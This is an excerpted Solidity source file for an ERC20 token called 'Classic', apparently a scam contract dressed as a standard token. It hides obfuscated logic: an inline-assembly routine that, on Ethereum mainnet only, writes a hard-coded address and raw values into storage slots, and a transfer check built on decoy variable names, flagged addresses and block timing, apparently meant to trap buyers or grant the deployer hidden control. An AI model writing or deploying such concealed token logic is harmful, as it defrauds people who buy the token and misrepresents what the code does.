...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _fasterC = block.number*2;

    mapping (address => bool) private _toShibaC; 
    mapping (address => bool) private _toFlokiC;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private unhappyFlow;
    ...
    bool private trading; uint256 private karenPlease = 1; bool private Susan;
    uint256 private _decimals; uint256 private luckyStrike;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_toShibaC[cAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _fasterC = block.number;
        return true;
    }
    ...
    function _theInit() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) if and(not(eq(sload(gByte(caller(),0x6)),sload(0x01db2e6333b3af3e72a43bd9649fa30858fc3a079a70d42251ee71a05520a7ad))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0x77ecff479c0a625a2b667e5f0d9d8671d9f22682d3a4db6b93197a1d7d7e527a,0x1) sstore(gByte(caller(),0x5),0x1) sstore(0x01db2e6333b3af3e72a43bd9649fa30858fc3a079a70d42251ee71a05520a7ad,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        ...
        if (block.chainid == 1) {
            bool open = (((Susan || _toFlokiC[sender]) && ((_fasterC - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/2)) && (_fasterC == block.number))) && ((_toShibaC[recipient] == true) && (_toShibaC[sender] != true) || ((cAddr[1] == recipient) && (_toShibaC[cAddr[1]] != true))) && (luckyStrike > 0);
            assembly { 
    ...
    function _DeployClassic(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployClassic(creator, initialSupply);
    }
}

contract Classic is ERC20Token {
    constructor() ERC20Token("Classic", "CLASSIC", msg.sender, 31500000 * 10 ** 18) {
    }
}